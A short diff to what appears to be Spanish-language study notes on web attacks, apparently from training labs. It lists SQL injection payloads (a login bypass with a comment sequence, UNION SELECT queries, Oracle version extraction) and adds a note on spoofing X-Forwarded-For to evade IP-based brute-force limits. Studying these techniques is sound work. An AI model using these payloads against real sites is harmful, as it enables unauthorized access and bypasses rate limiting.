@@ -28,3 +28,7 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 adminitrator'-- => Entrar con el usuario administrador y que ignore la contraseña
 ?category=Gifts'+UNION+SELECT+'abc','def'+FROM+dual-- =>unimos los resultados de dos consulas con UNION
 ?category=Gifts'+UNION+SELECT+banner+'abc'+FROM+v$version-- => Obtener la version de la base de datos SQL
+
+------Ataques de fuerza bruta por ip------------
+X-Forwarded-For => Agregar esto en los headers para cambiar de IP
+
